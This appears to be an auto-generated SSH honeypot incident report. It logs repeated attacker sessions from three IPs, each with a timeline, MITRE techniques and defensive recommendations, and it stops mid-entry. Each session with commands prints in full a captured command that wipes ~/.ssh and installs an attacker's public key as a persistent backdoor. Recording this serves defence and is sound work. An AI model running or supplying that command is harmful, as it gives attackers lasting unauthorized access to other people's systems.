| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:00:30` | `cowrie.session.connect` |
| `2026-06-01 11:00:30` | `cowrie.client.version` |
| `2026-06-01 11:00:30` | `cowrie.client.kex` |
| `2026-06-01 11:00:31` | `cowrie.login.success` |
| `2026-06-01 11:00:31` | `cowrie.session.params` |
| `2026-06-01 11:00:31` | `cowrie.command.input` |
| `2026-06-01 11:00:31` | `cowrie.command.failed` |
| `2026-06-01 11:00:32` | `cowrie.log.closed` |
| `2026-06-01 11:00:32` | `cowrie.session.params` |
| `2026-06-01 11:00:32` | `cowrie.command.input` |
| `2026-06-01 11:00:32` | `cowrie.session.file_download` |
| `2026-06-01 11:00:32` | `cowrie.log.closed` |
| `2026-06-01 11:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.157[.]138` to AbuseIPDB if not already reported
- [ ] Block `101.126.157[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377233aa5f06

| Field | Detail |
|---|---|
| **Source IP** | `101.126.157[.]138` |
| **First Seen** | 2026-06-01 11:00 |
| **Last Seen** | 2026-06-01 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:00:35` | `cowrie.session.connect` |
| `2026-06-01 11:00:35` | `cowrie.client.version` |
| `2026-06-01 11:00:35` | `cowrie.client.kex` |
| `2026-06-01 11:00:35` | `cowrie.login.success` |
| `2026-06-01 11:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.157[.]138` to AbuseIPDB if not already reported
- [ ] Block `101.126.157[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df19d73e975e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.44[.]184` |
| **First Seen** | 2026-06-01 11:04 |
| **Last Seen** | 2026-06-01 11:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:04:44` | `cowrie.session.connect` |
| `2026-06-01 11:04:44` | `cowrie.client.version` |
| `2026-06-01 11:04:44` | `cowrie.client.kex` |
| `2026-06-01 11:04:44` | `cowrie.login.success` |
| `2026-06-01 11:04:45` | `cowrie.session.params` |
| `2026-06-01 11:04:45` | `cowrie.command.input` |
| `2026-06-01 11:04:45` | `cowrie.command.failed` |
| `2026-06-01 11:04:45` | `cowrie.log.closed` |
| `2026-06-01 11:04:45` | `cowrie.session.params` |
| `2026-06-01 11:04:45` | `cowrie.command.input` |
| `2026-06-01 11:04:45` | `cowrie.session.file_download` |
| `2026-06-01 11:04:45` | `cowrie.log.closed` |
| `2026-06-01 11:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.44[.]184` to AbuseIPDB if not already reported
- [ ] Block `118.193.44[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f374f6fb7e27

| Field | Detail |
|---|---|
| **Source IP** | `118.193.44[.]184` |
| **First Seen** | 2026-06-01 11:04 |
| **Last Seen** | 2026-06-01 11:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:04:47` | `cowrie.session.connect` |
| `2026-06-01 11:04:47` | `cowrie.client.version` |
| `2026-06-01 11:04:47` | `cowrie.client.kex` |
| `2026-06-01 11:04:48` | `cowrie.login.success` |
| `2026-06-01 11:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.44[.]184` to AbuseIPDB if not already reported
- [ ] Block `118.193.44[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a47341561acb

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:07 |
| **Last Seen** | 2026-06-01 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:07:35` | `cowrie.session.connect` |
| `2026-06-01 11:07:35` | `cowrie.client.version` |
| `2026-06-01 11:07:35` | `cowrie.client.kex` |
| `2026-06-01 11:07:35` | `cowrie.login.success` |
| `2026-06-01 11:07:35` | `cowrie.session.params` |
| `2026-06-01 11:07:35` | `cowrie.command.input` |
| `2026-06-01 11:07:35` | `cowrie.command.failed` |
| `2026-06-01 11:07:35` | `cowrie.log.closed` |
| `2026-06-01 11:07:36` | `cowrie.session.params` |
| `2026-06-01 11:07:36` | `cowrie.command.input` |
| `2026-06-01 11:07:36` | `cowrie.session.file_download` |
| `2026-06-01 11:07:36` | `cowrie.log.closed` |
| `2026-06-01 11:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-991517d5722e

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:07 |
| **Last Seen** | 2026-06-01 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:07:37` | `cowrie.session.connect` |
| `2026-06-01 11:07:37` | `cowrie.client.version` |
| `2026-06-01 11:07:37` | `cowrie.client.kex` |
| `2026-06-01 11:07:37` | `cowrie.login.success` |
| `2026-06-01 11:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816b5e3d85ad

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:09 |
| **Last Seen** | 2026-06-01 11:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:09:31` | `cowrie.session.connect` |
| `2026-06-01 11:09:31` | `cowrie.client.version` |
| `2026-06-01 11:09:31` | `cowrie.client.kex` |
| `2026-06-01 11:09:31` | `cowrie.login.success` |
| `2026-06-01 11:09:32` | `cowrie.session.params` |
| `2026-06-01 11:09:32` | `cowrie.command.input` |
| `2026-06-01 11:09:32` | `cowrie.command.failed` |
| `2026-06-01 11:09:32` | `cowrie.log.closed` |
| `2026-06-01 11:09:32` | `cowrie.session.params` |
| `2026-06-01 11:09:32` | `cowrie.command.input` |
| `2026-06-01 11:09:32` | `cowrie.session.file_download` |
| `2026-06-01 11:09:32` | `cowrie.log.closed` |
| `2026-06-01 11:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb4284fd83c

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:09 |
| **Last Seen** | 2026-06-01 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:09:33` | `cowrie.session.connect` |
| `2026-06-01 11:09:33` | `cowrie.client.version` |
| `2026-06-01 11:09:33` | `cowrie.client.kex` |
| `2026-06-01 11:09:33` | `cowrie.login.success` |
| `2026-06-01 11:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e02739fd9acf

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:11 |
| **Last Seen** | 2026-06-01 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:11:13` | `cowrie.session.connect` |
| `2026-06-01 11:11:13` | `cowrie.client.version` |
| `2026-06-01 11:11:13` | `cowrie.client.kex` |
| `2026-06-01 11:11:14` | `cowrie.login.success` |
| `2026-06-01 11:11:14` | `cowrie.session.params` |
| `2026-06-01 11:11:14` | `cowrie.command.input` |
| `2026-06-01 11:11:14` | `cowrie.command.failed` |
| `2026-06-01 11:11:14` | `cowrie.log.closed` |
| `2026-06-01 11:11:14` | `cowrie.session.params` |
| `2026-06-01 11:11:14` | `cowrie.command.input` |
| `2026-06-01 11:11:14` | `cowrie.session.file_download` |
| `2026-06-01 11:11:14` | `cowrie.log.closed` |
| `2026-06-01 11:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89bd9b28576c

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:11 |
| **Last Seen** | 2026-06-01 11:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:11:15` | `cowrie.session.connect` |
| `2026-06-01 11:11:15` | `cowrie.client.version` |
| `2026-06-01 11:11:15` | `cowrie.client.kex` |
| `2026-06-01 11:11:15` | `cowrie.login.success` |
| `2026-06-01 11:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97b8d1f3710

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:13 |
| **Last Seen** | 2026-06-01 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:13:04` | `cowrie.session.connect` |
| `2026-06-01 11:13:04` | `cowrie.client.version` |
| `2026-06-01 11:13:04` | `cowrie.client.kex` |
| `2026-06-01 11:13:04` | `cowrie.login.success` |
| `2026-06-01 11:13:04` | `cowrie.session.params` |
| `2026-06-01 11:13:04` | `cowrie.command.input` |
| `2026-06-01 11:13:04` | `cowrie.command.failed` |
| `2026-06-01 11:13:04` | `cowrie.log.closed` |
| `2026-06-01 11:13:04` | `cowrie.session.params` |
| `2026-06-01 11:13:04` | `cowrie.command.input` |
| `2026-06-01 11:13:04` | `cowrie.session.file_download` |
| `2026-06-01 11:13:04` | `cowrie.log.closed` |
| `2026-06-01 11:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8ae502d673

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:13 |
| **Last Seen** | 2026-06-01 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:13:05` | `cowrie.session.connect` |
| `2026-06-01 11:13:05` | `cowrie.client.version` |
| `2026-06-01 11:13:05` | `cowrie.client.kex` |
| `2026-06-01 11:13:05` | `cowrie.login.success` |
| `2026-06-01 11:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-819ae77dcd88

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:19 |
| **Last Seen** | 2026-06-01 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:19:54` | `cowrie.session.connect` |
| `2026-06-01 11:19:54` | `cowrie.client.version` |
| `2026-06-01 11:19:54` | `cowrie.client.kex` |
| `2026-06-01 11:19:54` | `cowrie.login.success` |
| `2026-06-01 11:19:54` | `cowrie.session.params` |
| `2026-06-01 11:19:54` | `cowrie.command.input` |
| `2026-06-01 11:19:54` | `cowrie.command.failed` |
| `2026-06-01 11:19:54` | `cowrie.log.closed` |
| `2026-06-01 11:19:54` | `cowrie.session.params` |
| `2026-06-01 11:19:54` | `cowrie.command.input` |
| `2026-06-01 11:19:54` | `cowrie.session.file_download` |
| `2026-06-01 11:19:54` | `cowrie.log.closed` |
| `2026-06-01 11:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-512f1904afdf

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:19 |
| **Last Seen** | 2026-06-01 11:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:19:55` | `cowrie.session.connect` |
| `2026-06-01 11:19:55` | `cowrie.client.version` |
| `2026-06-01 11:19:55` | `cowrie.client.kex` |
| `2026-06-01 11:19:55` | `cowrie.login.success` |
| `2026-06-01 11:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-338238c21c06

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:21 |
| **Last Seen** | 2026-06-01 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:21:47` | `cowrie.session.connect` |
| `2026-06-01 11:21:47` | `cowrie.client.version` |
| `2026-06-01 11:21:47` | `cowrie.client.kex` |
| `2026-06-01 11:21:47` | `cowrie.login.success` |
| `2026-06-01 11:21:48` | `cowrie.session.params` |
| `2026-06-01 11:21:48` | `cowrie.command.input` |
| `2026-06-01 11:21:48` | `cowrie.command.failed` |
| `2026-06-01 11:21:48` | `cowrie.log.closed` |
| `2026-06-01 11:21:48` | `cowrie.session.params` |
| `2026-06-01 11:21:48` | `cowrie.command.input` |
| `2026-06-01 11:21:48` | `cowrie.session.file_download` |
| `2026-06-01 11:21:48` | `cowrie.log.closed` |
| `2026-06-01 11:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed85771c7349

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:21 |
| **Last Seen** | 2026-06-01 11:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:21:49` | `cowrie.session.connect` |
| `2026-06-01 11:21:49` | `cowrie.client.version` |
| `2026-06-01 11:21:49` | `cowrie.client.kex` |
| `2026-06-01 11:21:49` | `cowrie.login.success` |
| `2026-06-01 11:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.100.254[.]191` to AbuseIPDB if not already reported
- [ ] Block `34.100.254[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8827f737212

| Field | Detail |
|---|---|
| **Source IP** | `34.100.254[.]191` |
| **First Seen** | 2026-06-01 11:26 |
| **Last Seen** | 2026-06-01 11:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 11:26:56` | `cowrie.session.connect` |
| `2026-06-01 11:26:56` | `cowrie.client.version` |
| `2026-06-01 11:26:56` | `cowrie.client.kex` |
| `2026-06-01 11:26:56` | `cowrie.login.success` |
| `2026-06-01 11:26:56` | `cowrie.session.params` |
